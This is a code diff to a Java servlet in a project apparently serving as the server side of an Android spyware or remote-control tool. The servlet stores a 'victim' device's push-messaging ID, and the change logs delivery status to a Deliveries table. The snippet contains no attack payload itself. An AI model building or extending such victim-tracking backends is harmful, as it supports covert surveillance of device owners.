@@ -1,6 +1,8 @@
 package com.theah64.xrob.api.servlets;
 
+import com.theah64.xrob.api.database.tables.Deliveries;
 import com.theah64.xrob.api.database.tables.Victims;
+import com.theah64.xrob.api.models.Delivery;
 import com.theah64.xrob.api.utils.APIResponse;
 import com.theah64.xrob.api.utils.HeaderSecurity;
 import com.theah64.xrob.api.utils.Request;
@@ -34,14 +36,15 @@ public class FCMUpdateServlet extends BaseServlet {
             final boolean isUpdated = Victims.getInstance().update(Victims.COLUMN_ID, victimId, Victims.COLUMN_FCM_ID, fcmId);
 
             if (isUpdated) {
+                Deliveries.getInstance().add(new Delivery(victimId, false, "FCM Update", Delivery.TYPE_OTHER, 0));
                 out.write(new APIResponse("success", null).getResponse());
             } else {
+                Deliveries.getInstance().add(new Delivery(victimId, true, "FCM Update failed", Delivery.TYPE_OTHER, 0));
                 throw new RuntimeException("Failed to update the FCM id");
             }
 
         } catch (Exception e) {
             e.printStackTrace();
-            out.write(new APIResponse(e.getMessage()).getResponse());
         }
 
         out.flush();
